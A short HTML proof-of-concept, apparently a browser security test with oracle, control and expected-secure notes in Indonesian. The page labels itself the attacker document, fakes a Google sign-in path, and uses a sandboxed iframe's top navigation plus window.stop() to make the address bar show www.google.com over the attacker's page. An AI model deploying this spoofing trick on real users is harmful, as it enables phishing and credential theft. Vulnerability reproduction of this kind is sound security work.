<!doctype html><meta charset=utf-8>
<!-- PREDIKAT: bar melukis www.google.com sementara dokumen top tetap milikku
     ORACLE: klik tombol DI DALAM frame -> screenshot bar + panel REAL
     CONTROL: hapus window.stop() -> nav commit normal
     EXPECTED-SECURE: bar kembali ke URL nyata (atau tak pernah melukis target) saat nav dihentikan -->
<h2>top document (attacker)</h2>
<iframe id=fr sandbox="allow-scripts allow-top-navigation-by-user-activation"
  srcdoc="<button onclick='parent.postMessage(1,`*`);top.location=`https://www.google.com/`'>go (opaque-origin initiator)</button>"></iframe>
<pre id=p></pre>
<script>
history.replaceState(0, '', '/accounts/signin/identifier');   // pre-spoof path, tetap same-origin
function paint(){ p.textContent = 'REAL: ' + location.href + '\ninitiator: opaque (sandboxed srcdoc)'; }
addEventListener('message', () => setTimeout(() => { window.stop(); paint(); }, 40));
paint();
</script>
